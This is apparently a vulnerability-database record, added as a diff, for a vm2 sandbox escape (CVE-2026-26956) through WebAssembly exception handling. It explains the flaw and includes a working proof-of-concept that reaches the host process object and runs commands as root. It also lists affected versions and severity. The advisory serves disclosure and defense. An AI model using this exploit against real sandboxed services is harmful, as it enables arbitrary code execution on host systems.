@@ -1,0 +1,184 @@
+advisory_id: GHSA-ffh4-j6h5-pg66
+datasource_id: github_osv/GHSA-ffh4-j6h5-pg66
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-ffh4-j6h5-pg66/GHSA-ffh4-j6h5-pg66.json
+aliases:
+  - CVE-2026-26956
+summary: |
+  VM2 Has a WASM Sandbox Escape
+  ## Summary
+
+  Full sandbox escape with arbitrary code execution. Attacker code inside `VM.run()` obtains host process object and runs host commands with zero host cooperation.
+
+  ## Details
+
+  **Confirmed on:** vm2 3.10.4, Node.js v25.6.1 (x64 Linux)
+  **Trigger:** Attacker-controlled code passed to `VM.run()`
+  **Requires:** Node.js version with WebAssembly exception handling + JSTag support (tested on v25.6.1)
+
+  vm2's sandbox security relies on two JavaScript-level mechanisms: (1) a code transformer that injects `handleException()` into JS `catch` clauses to wrap host-realm errors, and (2) bridge Proxies that wrap cross-context objects. Both operate entirely within JavaScript.
+
+  WebAssembly's `try_table` instruction with a `JSTag` catch handler catches JavaScript exceptions at V8's C++ level — below JavaScript entirely. When an imported JS function throws a TypeError produced by Symbol-to-string coercion during stack formatting (`e.name = Symbol(); e.stack`), the WASM `try_table` catches it as an opaque `externref` and returns it as a normal function return value. This WASM exception-handling-to-return-value path is not sanitized by vm2 — the host-realm TypeError reaches attacker code unsanitized. Its constructor chain (`hostError.constructor.constructor`) resolves to a Function that returns the host process object, allowing for reflection outside of the vm2 context, leading to code execution.
+
+  ## PoC
+
+  ```js
+  const { VM } = require("vm2");
+  console.log("vm2:", require("vm2/package.json").version, "| node:", process.version);
+
+  new VM().run(`
+      const before = typeof process;
+
+      const err = new Error("x");
+      err.name = Symbol();
+
+      const wasm = new Uint8Array([
+          0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+          0x01,0x0c,0x03,0x60,0x00,0x00,0x60,0x00,0x01,0x6f,0x60,0x01,0x6f,0x00,
+          0x02,0x19,0x02,
+          0x03,0x65,0x6e,0x76,0x07,0x74,0x72,0x69,0x67,0x67,0x65,0x72,0x00,0x00,
+          0x02,0x6a,0x73,0x03,0x74,0x61,0x67,0x04,0x00,0x02,
+          0x03,0x02,0x01,0x01,
+          0x07,0x0f,0x01,
+          0x0b,0x63,0x61,0x74,0x63,0x68,0x5f,0x65,0x72,0x72,0x6f,0x72,0x00,0x01,
+          0x0a,0x12,0x01,0x10,0x00,
+          0x02,0x6f,0x1f,0x40,0x01,0x00,0x00,0x00,0x10,0x00,0x00,0x0b,0x00,0x0b,0x0b
+      ]);
+
+      const instance = new WebAssembly.Instance(
+          new WebAssembly.Module(wasm),
+          { env: { trigger() { err.stack; } }, js: { tag: WebAssembly.JSTag } }
+      );
+
+      const hostError = instance.exports.catch_error();
+      const p = hostError.constructor.constructor("return process")();
+      const id = p.mainModule.require("child_process").execSync("id").toString().trim();
+      const log = p.mainModule.require("console").log;
+      log("");
+      log("process before escape:", before);
+      log("process after escape: ", typeof p);
+      log("host pid:             ", p.pid);
+      log("host node version:    ", p.version);
+      log("RCE:                  ", id);
+  `);
+  ```
+
+  ```
+  > node poc.js
+  vm2: 3.10.4 | node: v25.6.1
+
+  process before escape: undefined
+  process after escape:  object
+  host pid:              217
+  host node version:     v25.6.1
+  RCE:                   uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+  ```
+
+  **Proof files**
+  [poc.js](https://github.com/user-attachments/files/25285089/poc.js)
+impacted_packages:
+  - purl: pkg:npm/vm2
+    affected_versions: vers:npm/<=3.10.4
+    fixed_versions: vers:npm/3.10.5
+    affected_packages:
+      - pkg:npm/vm2@0.1.0
+      - pkg:npm/vm2@0.1.1
+      - pkg:npm/vm2@0.2.0
+      - pkg:npm/vm2@0.2.1
+      - pkg:npm/vm2@0.2.2
+      - pkg:npm/vm2@0.2.3
+      - pkg:npm/vm2@0.2.4
+      - pkg:npm/vm2@1.0.0
+      - pkg:npm/vm2@1.0.1
+      - pkg:npm/vm2@2.0.0
+      - pkg:npm/vm2@2.0.2
+      - pkg:npm/vm2@3.0.0
+      - pkg:npm/vm2@3.0.1
+      - pkg:npm/vm2@3.1.0
+      - pkg:npm/vm2@3.2.0
+      - pkg:npm/vm2@3.3.0
+      - pkg:npm/vm2@3.3.1
+      - pkg:npm/vm2@3.4.0
+      - pkg:npm/vm2@3.4.1
+      - pkg:npm/vm2@3.4.2
+      - pkg:npm/vm2@3.4.3
+      - pkg:npm/vm2@3.4.4
+      - pkg:npm/vm2@3.4.5
+      - pkg:npm/vm2@3.4.6
+      - pkg:npm/vm2@3.5.0
+      - pkg:npm/vm2@3.5.1
+      - pkg:npm/vm2@3.5.2
+      - pkg:npm/vm2@3.6.0
+      - pkg:npm/vm2@3.6.1
+      - pkg:npm/vm2@3.6.2
+      - pkg:npm/vm2@3.6.3
+      - pkg:npm/vm2@3.6.4
+      - pkg:npm/vm2@3.6.5
+      - pkg:npm/vm2@3.6.6
+      - pkg:npm/vm2@3.6.7
+      - pkg:npm/vm2@3.6.8
+      - pkg:npm/vm2@3.6.9
+      - pkg:npm/vm2@3.6.10
+      - pkg:npm/vm2@3.6.11
+      - pkg:npm/vm2@3.7.0
+      - pkg:npm/vm2@3.8.0
+      - pkg:npm/vm2@3.8.1
+      - pkg:npm/vm2@3.8.2
+      - pkg:npm/vm2@3.8.3
+      - pkg:npm/vm2@3.8.4
+      - pkg:npm/vm2@3.9.0
+      - pkg:npm/vm2@3.9.1
+      - pkg:npm/vm2@3.9.2
+      - pkg:npm/vm2@3.9.3
+      - pkg:npm/vm2@3.9.4
+      - pkg:npm/vm2@3.9.5
+      - pkg:npm/vm2@3.9.6
+      - pkg:npm/vm2@3.9.7
+      - pkg:npm/vm2@3.9.8
+      - pkg:npm/vm2@3.9.9
+      - pkg:npm/vm2@3.9.10
+      - pkg:npm/vm2@3.9.11
+      - pkg:npm/vm2@3.9.12
+      - pkg:npm/vm2@3.9.13
+      - pkg:npm/vm2@3.9.14
+      - pkg:npm/vm2@3.9.15
+      - pkg:npm/vm2@3.9.16
+      - pkg:npm/vm2@3.9.17
+      - pkg:npm/vm2@3.9.18
+      - pkg:npm/vm2@3.9.19
+      - pkg:npm/vm2@3.10.0
+      - pkg:npm/vm2@3.10.1
+      - pkg:npm/vm2@3.10.2
+      - pkg:npm/vm2@3.10.3
+      - pkg:npm/vm2@3.10.4
+    fixed_packages:
+      - pkg:npm/vm2@3.10.5
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-ffh4-j6h5-pg66/GHSA-ffh4-j6h5-pg66.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+  - CWE-693
+references:
+  - url: https://github.com/patriksimek/vm2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/releases/tag/v3.10.5
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-26956
+    reference_type:
+    reference_id: CVE-2026-26956
+  - url: https://github.com/patriksimek/vm2/security/advisories/GHSA-ffh4-j6h5-pg66
+    reference_type:
+    reference_id: GHSA-ffh4-j6h5-pg66
+exploits: []
